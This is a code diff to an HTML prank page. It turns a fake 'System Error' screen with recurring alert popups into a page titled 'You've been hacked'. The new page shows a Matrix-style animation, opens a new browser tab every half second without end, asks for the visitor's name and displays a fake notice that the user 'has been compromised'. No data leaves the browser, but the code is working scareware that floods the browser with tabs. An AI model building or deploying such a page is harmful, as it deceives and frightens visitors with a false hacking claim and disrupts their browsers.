@@ -3,50 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Error</title>
+    <title>You’ve Been Hacked</title>
     <style>
         body {
-            margin: 0;
             background: black;
-            color: red;
+            color: green;
             font-family: 'Courier New', monospace;
             text-align: center;
             overflow: hidden;
         }
-        #message {
+        #matrix {
+            position: absolute;
+            top: 0;
+            left: 0;
+            color: lime;
             font-size: 24px;
-            margin-top: 20%;
-            animation: flicker 0.2s infinite alternate;
+            white-space: nowrap;
+            z-index: 1;
+            pointer-events: none;
         }
-        @keyframes flicker {
-            0% { opacity: 1; }
-            100% { opacity: 0.5; }
+        #message {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 32px;
+            font-weight: bold;
+            z-index: 2;
         }
     </style>
 </head>
 <body>
-    <div id="message">ERROR: SYSTEM FAILURE DETECTED...</div>
+    <div id="matrix"></div>
+    <div id="message">
+        <p>You’ve been hacked!</p>
+        <p id="history"></p>
+    </div>
     <script>
-        function showAlert() {
-            alert("Warning: Unauthorized access detected!");
-        }
-        setInterval(showAlert, 3000); // Show an alert every 3 seconds
+        // Matrix Code Effect
+        const matrixDiv = document.getElementById('matrix');
+        const matrixCols = Math.floor(window.innerWidth / 20);
+        const matrixRows = Math.floor(window.innerHeight / 20);
+        const matrixChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let matrixArray = [];
 
-        function changeBg() {
-            document.body.style.background = (Math.random() < 0.5) ? 'black' : 'red';
+        // Generate Matrix Effect
+        for (let i = 0; i < matrixCols; i++) {
+            matrixArray.push([]);
         }
-        setInterval(changeBg, 500); // Change background color every 0.5s
-
-        let text = "Critical system error... Attempting fix...";
-        let i = 0;
-        function typeEffect() {
-            if (i < text.length) {
-                document.getElementById("message").textContent += text[i];
-                i++;
-                setTimeout(typeEffect, 100);
+        function generateMatrix() {
+            matrixDiv.innerHTML = '';
+            for (let i = 0; i < matrixCols; i++) {
+                let char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                let span = document.createElement('span');
+                span.style.position = 'absolute';
+                span.style.left = (i * 20) + 'px';
+                span.style.top = (Math.random() * window.innerHeight) + 'px';
+                span.textContent = char;
+                matrixDiv.appendChild(span);
             }
         }
-        setTimeout(typeEffect, 2000); // Start typing effect after 2s
+        setInterval(generateMatrix, 100);
+
+        // Infinite Tab Opening
+        function openTabs() {
+            window.open('about:blank');
+        }
+        setInterval(openTabs, 500); // Open new tab every 500ms
+
+        // Your Name Appears
+        const userName = prompt('Enter your name:');
+        document.getElementById('history').textContent = 'History: User ' + userName + ' has been compromised.';
+
+        // Trigger Matrix Animation
+        generateMatrix();
     </script>
 </body>
 </html>
